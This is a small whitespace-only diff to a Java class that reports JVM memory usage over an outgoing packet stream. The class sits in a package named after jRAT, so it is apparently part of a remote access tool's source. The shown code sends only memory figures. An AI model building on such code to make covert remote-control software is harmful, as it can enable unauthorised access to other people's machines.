@@ -4,7 +4,6 @@ import java.io.DataOutputStream;
 
 import pro.jrat.common.io.StringWriter;
 
-
 public class Packet24JVMMemory extends AbstractOutgoingPacket {
 
 	@Override
@@ -12,7 +11,7 @@ public class Packet24JVMMemory extends AbstractOutgoingPacket {
 		Runtime rt = Runtime.getRuntime();
 		long usedMB = (rt.totalMemory() - rt.freeMemory()) / 1024L / 1024L;
 		long totalMB = rt.totalMemory() / 1024L / 1024L;
-		
+
 		dos.writeLong(usedMB);
 		dos.writeLong(totalMB);
 	}
